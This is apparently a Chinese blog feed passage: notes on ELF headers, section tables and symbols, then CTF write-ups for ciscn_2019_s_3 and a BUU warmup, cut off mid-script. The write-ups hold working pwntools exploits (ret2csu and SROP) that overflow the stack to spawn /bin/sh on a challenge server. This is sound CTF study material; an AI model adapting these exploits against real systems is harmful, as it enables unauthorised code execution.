Table)，该表描述了ELF文件包含的所有段的信息，如每个段的段名、段的长度、在文件中的偏移和读写权限等。</p><h3 id="4-1-文件头"><a href="#4-1-文件头" class="headerlink" title="4.1 文件头"></a>4.1 文件头</h3><p>查看ELF文件</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210141759681.png" alt="image-20210210141759681"></p><p>ELF头中包括了<strong>魔数，文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、重定位类型、硬件平台、平台版本、入口地址、程序头入口和长度、段表位置和长度及段的数量</strong></p><p>为了更好定义各个成员大小、elf.h有一套自己变量体系</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142310041.png" alt="image-20210210142310041"></p><p>下面来看一下“Elf32_Ehdr”这个结构体</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142459097.png" alt="image-20210210142459097"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142507074.png" alt="image-20210210142507074"></p><p>之后我们来对照一下</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142536099.png" alt="image-20210210142536099"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142548337.png" alt="image-20210210142548337"></p><p>这里具体来说一下魔数</p><p><strong>魔数</strong>：</p><p>ELF的魔数上面我们可以看到是16字节，也就是对应的16个数组</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142844872.png" alt="image-20210210142844872"></p><p>最开始的4个字节是ELF文件必须相同的标识码</p><p>为0x7F 0x45 0x4C 0x46 7F是ascii中的DEL控制符，45 4c 46分别是ascii中的ELF。几乎所有可执行文件格式开始都是魔数，如a.out的0x01 0x07，PE中的0x4d 0x5a。</p><p>那么魔数是来干什么的？模式是用来确认文件的类型，操作系统在加载可执行文件的时候会确认魔数是否正确，如果不正确将会拒绝加载。</p><p>下一个字节是0x01表示32位 0x02表示64位 </p><p>第6个字节序 规定是大端还是小端</p><p>第7个是主版本号，一般为1。后面的9个一般填0</p><p><strong>文件类型</strong></p><p>e_type成员表示文件类型，就是前面说的三种文件类型。</p><p>操作系统通过这个来判断ELF文件类型，而不是通过后缀名。</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210143702078.png" alt="image-20210210143702078"></p><h3 id="4-2-段表"><a href="#4-2-段表" class="headerlink" title="4.2 段表"></a>4.2 段表</h3><p><strong>段表（Section Header Table）</strong>是保存这些段的基本属性的结构。</p><p>可以说，ELF文件的段结构就是由段表来决定的，编译器、链接器、和装载器都是依靠段表来定位和访问各个段的属性的。</p><p>段表由ELF文件头的<code>e_shoff</code>成员决定。</p><p>下面我们来看一下真正的段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S a.o</span><br><span class="line">&#x2F;&#x2F;各个段</span><br></pre></td></tr></table></figure><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210144604296.png" alt="image-20210210144604296"></p><p>每个段都是以<code>Elf32_Shdr</code>结构体，因此<code>Elf32_Shdr</code>又叫做<strong>段描述符</strong></p><p>所以上面就是有13个结构体，此外第一个是无用的，所以只有12个有效段。</p><p>可以来看一下<code>Elf32_Shdr</code></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210144945550.png" alt="image-20210210144945550"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145159772.png" alt="image-20210210145159772"></p><p><strong>段的类型</strong></p><p>段的名字只在链接和编译中有意义，但不能真正表示段的类型。</p><p>对于编译器和链接器来说，<strong>主要决定段的属性是段的类型（sh_type）和段的标志位(sh_flags)</strong></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145930584.png" alt="image-20210210145930584"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145922440.png" alt="image-20210210145922440"></p><p><strong>段的标志位</strong></p><p>段的标志位表示该段在进程虚拟地址空间中的属性，如是否可写可执行等。</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150400718.png" alt="image-20210210150400718"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150408040.png" alt="image-20210210150408040"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150429555.png" alt="image-20210210150429555"></p><p><strong>段的链接信息</strong></p><p>如果段类型是与链接相关的，如重定位表、符号表等，那么sh_link和sh_info是有意义的</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150637999.png" alt="image-20210210150637999"></p><h3 id="4-3-重定位表"><a href="#4-3-重定位表" class="headerlink" title="4.3 重定位表"></a>4.3 重定位表</h3><p>链接器在处理目标文件时，需要对目标文件中某些部位进行重定位，即代码段和数据段中那些对绝对地址引用的位置。这些重定位记录都会记录在重定位表里。</p><p><code>.rel.text</code>就是一个重定位表。</p><p><strong>每个重定位的段都会有一个相应的重定位的表</strong>。</p><p>如<code>.text</code>中有<code>printf</code>的调用，所以就会有<code>.rel.text</code>而<code>.data</code>就没有重定位的。</p><p>重定位表同时也是ELF的一个段，所以这个段的类型就是<code>SHT_REL</code>类型。<code>sh_link</code>就是符号表的下标，<code>sh_info</code>就是作用于哪个段。</p><hr><h3 id="4-4-字符串表"><a href="#4-4-字符串表" class="headerlink" title="4.4 字符串表"></a>4.4 字符串表</h3><p>字符串由于比较复杂，所以把字符串集中在一个表里就很简便，然后用偏移来表示字符串。</p><h2 id="5-符号"><a href="#5-符号" class="headerlink" title="5.符号"></a>5.符号</h2><p>在链接中，目标文件中间相互拼合实际上是目标文件之间对地址的引用。即对函数和变量的地址的引用。</p><p>如目标文件B用目标文件A中foo函数，那么就是目标文件A<strong>定义了foo</strong>，目标文件B<strong>引用了foo</strong>。</p><p>在链接中，我们将函数和变量统称为<strong>符号</strong>，函数名和变量名为<strong>符号名</strong></p><p><strong>在链接过程中很关键就是符号的管理，每一个目标文件都会有一个相应的符号表，这个表里面记录了目标文件用到的所有符号。每个定义的符号有一个对应的值叫符号值，符号值就是地址。</strong></p><p>具体符号有下面几种类型</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210153736035.png" alt="image-20210210153736035"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nm a.o</span><br><span class="line">&#x2F;&#x2F;看符号</span><br></pre></td></tr></table></figure><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210203929970.png" alt="image-20210210203929970"></p><h3 id="5-1-ELF符号表结构"><a href="#5-1-ELF符号表结构" class="headerlink" title="5.1 ELF符号表结构"></a>5.1 ELF符号表结构</h3><p>ELF文件中符号表往往是一个段，一般叫做<code>.symtab</code>。符号表的结构是一个ELF32_Sym结构的数组，每个结构都是一个符号。</p><p>Elf32_Sym的结构定义</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204148472.png" alt="image-20210210204148472"></p><p>成员意义如下图</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204233887.png" alt="image-20210210204233887"></p><p><strong>符号类型和绑定信息（st_info）</strong></p><p>成员低4为是符号的类型，高28为表示符号绑定信息</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204418983.png" alt="image-20210210204418983"></p><p><strong>符号所在段（st_shndx）</strong></p><p>如果符号定义在本目标文件中，这个成员表示符号所在的段在段表的下标；但如果符号不是定义在本目标文件中，或者对于有些特殊符号，sh_shndx的值会有些特殊</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204647740.png" alt="image-20210210204647740"></p><p><strong>符号值</strong></p><p>上文说了，符号值就是每一个符号的变量地址</p><p>具体来说，有以下几种类型</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204943554.png" alt="image-20210210204943554"></p><p>看一下我们的符号表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s a.o</span><br></pre></td></tr></table></figure><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205129282.png" alt="image-20210210205129282"></p><blockquote><p>第一列Num就是数组下标，从零开始</p><p>第二列vaule就是符号值，<code>st_value</code></p><p>第三列Size为符号大小<code>st_size</code></p><p>第四列和第五列为符号类型和绑定信息</p><p>第七列就是Ndx即<code>st_shndx</code>表示符号所在的段。</p><p>最后一列就是符号名称</p></blockquote><p>具体解释如下</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205708052.png" alt="image-20210210205708052"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205716690.png" alt="image-20210210205716690"></p><h3 id="5-2-特殊符号"><a href="#5-2-特殊符号" class="headerlink" title="5.2 特殊符号"></a>5.2 特殊符号</h3><p>特殊符号就是你无须定义它们，但你可以声明并使用他们。</p><p>并且只有用ld链接器生产最终可执行文件这些符号才会存在，链接器会在将程序最终链接成可执行文件是将其解析成正确的值。</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210211122171.png" alt="image-20210210211122171"></p><p>后面的签名、强弱就跳过了，需要时继续研究。</p><h1 id="0x03-静态链接"><a href="#0x03-静态链接" class="headerlink" title="0x03 静态链接"></a>0x03 静态链接</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-编译和链接&quot;&gt;&lt;a href=&quot;#0x01-编译和链接&quot; class=&quot;headerlink&quot; title=&quot;0x01 编译和链接&quot;&gt;&lt;/a&gt;0x01 编译和链接&lt;/h1&gt;&lt;h2 id=&quot;1-被隐藏了的过程&quot;&gt;&lt;a href=&quot;#1-被隐藏了的过程&quot; c</summary>
      
    
    
    
    
    <category term="Book" scheme="https://pz1o.top/tags/Book/"/>
    
  </entry>
  
  <entry>
    <title>一道栈题</title>
    <link href="https://pz1o.top/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/"/>
    <id>https://pz1o.top/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/</id>
    <published>2021-02-14T08:54:00.000Z</published>
    <updated>2021-03-03T07:28:21.329Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a><strong>ciscn_2019_s_3</strong></h1><p>国赛的一道栈题</p><p>main函数</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214151957313.png" alt="image-20210214151957313"></p><p>vuln函数</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214152021865.png" alt="image-20210214152021865"></p><p>gadgets函数</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214152042139.png" alt="image-20210214152042139"></p><p>看一下gadgets函数</p><p>里面有0f（15）和3b（59）看一下这两个是什么</p><blockquote><p>15 sys_rt_sigreturn<br>59 sys_execve</p></blockquote><p><strong>接下来说一下syscall</strong></p><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>什么时syscall</p><p>看wiki</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214153005144.png" alt="image-20210214153005144"></p><p>在32位和64位中是有些不同的</p><blockquote><p>32位：</p><p>传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</p><p>调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4</p><p>调用方式: 使用 int 80h 中断进行系统调用</p><p>64位：</p><p>传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</p><p>调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1</p><p>stub_execve 的调用号 为 59 stub_rt_sigreturn 的调用号 为 15</p><p>调用方式: 使用 syscall 进行系统调用</p></blockquote><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>接下来继续看题解</p><p>从汇编中我们可以看到</p><p>在vuln函数中有栈溢出</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214153444144.png" alt="image-20210214153444144"></p><p>同时这个题还有一个地方</p><p>就是最后时没有leave的</p><p>也就是offset是0x10，之后就是返回地址</p><hr><p>接下来看gadgets</p><p>它里面有两个调用号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax，0Fh    &#x2F;&#x2F;   0Fh  即15    而15 对应的是 sys_rt_sigreturn系统调用</span><br><span class="line">mov rax，3Bh     &#x2F;&#x2F;  3Bh  即 59    而15 对应的是  sys_execve 系统调用</span><br></pre></td></tr></table></figure><p>所以有两种方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一种：利用 ret2__libc_csu_init 去构造 execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0) 来 getshell</span><br><span class="line">第二种：直接srop 伪造 sigreturn frame 去 构造 execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0) 来 getshell</span><br></pre></td></tr></table></figure><h2 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h2><h3 id="ret2-libc-csu-init"><a href="#ret2-libc-csu-init" class="headerlink" title="ret2__libc_csu_init"></a>ret2__libc_csu_init</h3><p>既然想系统调用，我们就得传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdi &quot;&#x2F;bin&#x2F;sh&quot;的指针</span><br><span class="line">rsi 0</span><br><span class="line">rdx 0</span><br></pre></td></tr></table></figure><p>首先想到的肯定是gadget</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214154550271.png" alt="image-20210214154550271"></p><p>rdi rsi 都有了但问题是没有rdx</p><p>这时就可以看ida了</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214162318162.png" alt="image-20210214162318162"></p><p>看到有rdx</p><p>这样我们就可以利用gadget了，但问题是要想获得/bin/sh的指针</p><p>就需要知道栈上的地址</p><p>也不知道是什么，看网上wp，都说write中有，调试了一下确实</p><p>原因不太清楚</p><p>接下来就是写wp了</p><ol><li><p>第一步我们需要得到bin/sh的指针</p></li><li><p>接下来第二步就是ROP，这里有一个不好理解的就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure><p>因为我们r12是指向栈上的,且rbx每次都是加一，这样其实就利用了我们的gadget</p></li><li><p>最后就是循环调用上面的call，知道系统调用</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process("./ciscn_2019_s_3")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28985</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">vuln_addr=<span class="number">0x4004ED</span></span><br><span class="line">mov_rax_execv_addr=<span class="number">0x4004E2</span>   </span><br><span class="line">pop_rdi_ret_addr=<span class="number">0x4005a3</span>  </span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret_addr=<span class="number">0x40059A</span></span><br><span class="line">__libc_csu_init_addr=<span class="number">0x400580</span>  <span class="comment"># __libc_csu_init gadget 首地址</span></span><br><span class="line">syscall_addr=<span class="number">0x400501</span>             <span class="comment">#ida中查看</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'/bin/sh\x00'</span>*<span class="number">2</span>+p64(vuln_addr)</span><br><span class="line">sl(payload1)</span><br><span class="line">r(<span class="number">0x20</span>)</span><br><span class="line">bin_sh_addr=uu64(r(<span class="number">8</span>))<span class="number">-280</span></span><br><span class="line">leak(<span class="string">"/bin/sh"</span>,bin_sh_addr)</span><br><span class="line">payload2=<span class="string">'/bin/sh\x00'</span>*<span class="number">2</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh_addr+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">print(hex(bin_sh_addr+<span class="number">0x50</span>))</span><br><span class="line">payload2+=p64(__libc_csu_init_addr)+p64(mov_rax_execv_addr)</span><br><span class="line">payload2+=p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(syscall_addr) </span><br><span class="line">sl(payload2)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><p><strong>这就是ret2__libc_csu_init()</strong></p><h2 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2><p>先介绍SROP</p><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>SROP也是栈溢出，但不同ROP的是。</p><p>SROP使用能够调用sigreturn的gadget覆盖返回地址，并将一个伪造的sigcontext结构体放到栈中。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p><strong>signal机制</strong></p><p>当有中断或异常产生时，内核会向某个进程发送一个signal，该进程被挂起并进入内核，然后内核为其保存上下文，再跳转到之前注册好的signal handler中进行处理</p><p>待signal handler返回后，内核为该进程恢复之前保存的上下文，最终恢复执行。</p><ol><li>一个signal frame被添加到栈，这个frame包含了寄存器的值和一些signal信息</li><li>一个新的返回地址被添加到栈顶，这个返回地址指向sigreturn调用</li><li>signal handler 被调用，signal handler的行为取决于收到什么signal</li><li>signal handler执行后，如果程序没有终止，则返回地址用于执行sigreturn调用</li><li>sigreturn利用signal frame恢复所有寄存器以回到之前状态</li><li>程序继续执行</li></ol><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214203411860.png" alt="image-20210214203411860"></p><blockquote><p>我们称 ucontext 以及 siginfo 这一段为 Signal Frame。</p><p>其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。</p></blockquote><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>系统在执行sigreturn系统调用的时候，不会对signal检查。</p><p>由于sigreturn会从用户栈上恢复所有寄存器的值，而用户栈是保存在用户进程地址空间中的，是用户进程可读写的。</p><p>如果攻击者控制栈，也就控制了寄存器的值。</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214203929462.png" alt="image-20210214203929462"></p><p><strong>一系列函数</strong></p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210215144016291.png" alt="image-20210215144016291"></p><p>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</p><ul><li><strong>可以通过栈溢出来控制栈的内容</strong></li><li>需要知道相应的地址<ul><li><strong>“/bin/sh”</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall</strong></li><li><strong>sigreturn</strong></li></ul></li><li>需要有够大的空间来塞下整个 sigal frame</li></ul><p>接下来，看我们这个题</p><p>syscall sigreturn 是我们知道的</p><p>接下来解决bin/sh就可以，由第一种解法我们已经知道栈上指向/bin/sh的指针</p><p>接下来直接写就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29158</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x04005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">vuln_addr = <span class="number">0x4004ED</span></span><br><span class="line">sigreturn = <span class="number">0x04004DA</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"/bin/sh\x00/bin/sh\x00"</span> + p64(vuln_addr)</span><br><span class="line">sl(payload1)</span><br><span class="line">print(r(<span class="number">0x20</span>))</span><br><span class="line">binsh = u64(r(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">leak(<span class="string">"/bin/sh"</span>,binsh)</span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = binsh</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line">payload = <span class="string">"/bin/sh\x00/bin/sh\x00"</span> + p64(sigreturn) + p64(syscall) + str(sigframe)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><blockquote><p>pwntools已经集成了sigreturn</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ciscn-2019-s-3&quot;&gt;&lt;a href=&quot;#ciscn-2019-s-3&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_s_3&quot;&gt;&lt;/a&gt;&lt;strong&gt;ciscn_2019_s_3&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;国赛的一道</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>BUU(PWN1)---栈</title>
    <link href="https://pz1o.top/2021/01/23/BUU-PWN/"/>
    <id>https://pz1o.top/2021/01/23/BUU-PWN/</id>
    <published>2021-01-23T06:22:39.000Z</published>
    <updated>2021-03-08T08:20:25.868Z</updated>
    
    <content type="html"><![CDATA[<p>寒假开始刷题</p><h1 id="BUU（栈）"><a href="#BUU（栈）" class="headerlink" title="BUU（栈）"></a>BUU（栈）</h1><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#node3.buuoj.cn:28301</span></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28301</span>)</span><br><span class="line"><span class="comment">#r = process("")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x40</span>+<span class="number">0x8</span>) + p64(<span class="number">0x40060d</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span 